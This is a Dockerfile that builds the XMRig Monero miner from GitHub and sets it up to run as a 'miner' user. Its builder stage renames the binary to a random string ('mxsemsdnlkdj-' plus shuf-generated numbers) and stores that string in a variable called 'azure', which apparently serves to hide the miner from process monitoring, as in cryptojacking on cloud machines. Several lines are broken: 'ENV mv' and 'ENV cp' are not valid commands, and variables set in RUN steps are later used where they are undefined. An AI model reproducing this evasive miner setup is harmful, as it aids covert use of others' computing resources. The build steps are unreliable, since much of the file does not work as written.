ARG ALPINE_VERSION=3.10
FROM lchaia/alpine-gcc:7.4.0 as builder

RUN apk --no-cache add \
    libuv-dev \
    openssl-dev \
    libmicrohttpd \
    git \
    cmake

RUN apk --no-cache add \
    --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing \
    hwloc-dev

ARG XMRIG_VERSION=v4.6.2-beta
ARG XMRIG_BUILD_ARGS="-DCMAKE_BUILD_TYPE=Release"
RUN azure=mxsemsdnlkdj;
WORKDIR /xmrig
# Clone XMRIG
RUN git clone -b ${XMRIG_VERSION} --single-branch --depth 1 https://github.com/xmrig/xmrig ./ && \
    a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d && \
    mkdir build && \
    cmake ${XMRIG_BUILD_ARGS} . && \
    make
ENV mv xmrig $azure -n
ENV cp $azure "$cpuname"
RUN ./"${cpuname}" --help

FROM alpine:${ALPINE_VERSION}

COPY --from=builder /xmrig/xmrig /bin/

RUN apk --no-cache add \
    libuv-dev 

RUN apk --no-cache add \
    --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing \
    hwloc-dev

RUN adduser -S -D -H -h /xmrig miner
RUN "${cpuname}" --help

USER miner

ENTRYPOINT [""${cpuname}""]
CMD [ "--help" ]




  
